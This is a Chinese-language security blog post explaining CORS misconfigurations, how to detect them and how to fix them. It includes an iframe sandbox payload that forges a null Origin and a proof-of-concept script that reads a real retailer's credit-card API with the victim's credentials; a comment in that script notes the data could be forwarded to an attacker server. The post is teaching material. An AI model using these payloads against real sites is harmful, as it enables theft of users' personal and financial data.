# CORS漏洞检测和利用方式


## 简介

CORS全称`Cross-Origin Resource Sharing`, 跨域资源共享，是HTML5的一个新特性，已被所有浏览器支持，不同于古老的jsonp只能get请求，被发明出来就是为了干掉JSONP的，因为用的多，其安全问题也更加普遍。

解决了跨域情况下资源的请求与传输。



## CORS实现原理



> 有个常见的关于同源策略的误区需要指出一下，同源策略并不限制请求的发起和响应，只是浏览器拒绝了js对响应资源的操作



CORS本质上就是使用各种头信息让浏览器与服务器之间进行交流，上面提到的名单就是用下面的http头字段来控制的：

![cors的http字段](http://image.xpshuai.cn/img/image-20220112212319982.png)

其中比较重要的相应头为：

```
Access-Control-Allow-Origin: http://a.com  表示服务端接受来自http://a.com的跨域请求
Access-Control-Allow-Credentials: true  表示是否允许发送Cookie，true即发送cookie
```





## CORS常见安全问题

实际中我们可能会遇到各种场景，所以CORS也很容易出现配置上的安全问题，大概有如下几种：

### 1 反射Origin头

当管理员想允许多个域名跨域请求时，以下写法都是不允许的

```bash
Access-Control-Allow-Origin: http://a.com, http://c.com
#或者
Access-Control-Allow-Origin: http://*.a.com
```

因为CORS标准规定，Access-Control-Allow-Origin**只能配置为单个origin, null或***。

有些开发者为了方便，直接使用请求者的origin作为Access-Control-Allow-Origin的域名，例如下面的Nginx配置:

```bash
add_header "Access-Control-Allow-Origin" $http_origin;
add_header "Access-Control-Allow-Credentials" "true";

# 这种配置非常危险，相当于任意网站可以直接跨域读取其资源内容。
```





### 2 Origin 校验错误

前面那种反射Origin的做法过于暴力，一般不可取，常用做法是通过自定义规则来校验Origin头，但是在校验过程中也会出现错误。这些错误可以分为四类：

- **前缀匹配**：例如想要允许example.com访问，但是只做了前缀匹配，导致同时信任了example.com.attack.com的访问。
- **后缀匹配**：例如想要允许example.com访问，由于后缀匹配出错，导致允许attackexample.com访问。
- **没有转义`.`**：例如想要允许www.example.com访问，但正则匹配没有转义`.`，导致允许wwwaexample.com访问。
- **包含匹配**：例如想要允许example.com，但是Origin校验出错，出现允许ample.com访问。



### 3 信任null

当配置信任名单为null，可以用来和本地file页面共享数据，如下所示：

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

但是攻击者也可以构造Origin为null的跨域请求，比如通过iframe sandbox：

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script>
var xhr=new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
    }
}
xhr.open("GET", "http://www.a.com/a.php", true);
xhr.withCredentials = true;
xhr.send();</script>'>
</iframe>
```



### 4 HTTPS域信任HTTP域

但是如果该HTTPS网站配置了CORS且信任HTTP域，那么中间人攻击者可以先劫持受信任HTTP域，然后通过这个域发送跨域请求到HTTPS网站，间接读取HTTPS域下的受保护内容.



### 5 信任自身全部子域

很多网站为了方便会将CORS配置为信任全部自身子域，这种配置会扩大子域 XSS的危害。

比如某子站存在xss时，可以通过此xss发送跨域请求，从而获取敏感内容。



### 6 Origin:*与 Credentials:true 共用

`Access-Control-Allow-Origin:*`用于表示允许任意域访问，这种配置只能用于共享公开资源。

所以下面这种配置是错误的，浏览器不允许这两种配置同时出现。(对于共享公开资源，不应该需要身份认证)

```
Access-Control-Allow-Origin: * 
Access-Control-Allow-Credentials: true 
```



### 7 缺少Vary: Origin头

如果一个资源享有多个域名，它需要对不同域名的请求包生成不同的Access-Control-Allow-Origin头。如果一个请求的响应被缓存，且返回中没有Vary: Origin字段，可能会导致其它域名的请求失效。

比如c.com同时允许a.com和b.com共享。c.com资源内容首先被a.com脚本跨域访问后被缓存，其中缓存响应头为`Access-Control-Allow-Origin:http://a.com`这时，b.com脚本则不能读取缓存响应内容，因为缓存响应头是允许a.com共享，而不是b.com。





## 检测方式

F1.curl访问网站　　

```
curl http://www.xpshuai.cn -H "Origin: https://test.com" -I
```

检查返回包的 Access-Control-Allow-Origin 字段是否为https://test.com



F2.burpsuite发送请求包，查看返回包



F3.也可以用开源工具：https://github.com/chenjj/CORScanner



F4.对于网站漏洞的挖掘可以使用burp，先勾选上proxy --> options --> Origin --> match and replace里面的Add spoofed CORS origin。

然后在网站观察功能点，最后在HTTP history来筛选带有CORS头部的值，然后用以上工具查看是否有配置缺陷。

检测到CORS配置错误以后，以下有一份poc可用来写报告（感谢大佬）：

```javascript
<script>
    //以受害者身份，发送一个跨域请求给目标url
    var req = new XMLHttpRequest();
    req.open('GET',"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card",true);
    req.onload = stealData;
    req.withCredentials = true;
    req.send();

    function stealData(){
        //由于目标站点的CORS配置错误，我们可以读取到相应包
        var data= JSON.stringify(JSON.parse(this.responseText),null,2);

        //展示相应包到这个页面上，作为hacker还可以将内容发送到自己的服务器
        output(data);
    }

    function output(inp) {
        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
    }
</script>

```



## 危害

1.同于csrf跨站请求伪造，发送钓鱼链接，读取用户敏感数据。

​	还可以获取cookie，针对http-only js代码无法读取的情况



2.结合xss漏洞利用cors漏洞，针对http_only js代码无法读取











## 漏洞防范

- 不要盲目反射Origin头
- 严格校验Origin头，避免出现权限泄露
- 不要配置Access-Control-Allow-Origin: null
- HTTPS网站不要信任HTTP域
- 不要信任全部自身子域，减少攻击面
- 不要配置Origin:*和Credentials: true
- 增加Vary: Origin头







## 参考文章

[CORS介绍及其漏洞检测 - SAUCERMAN (saucer-man.com)](https://saucer-man.com/information_security/331.html)



---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/cors%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/  

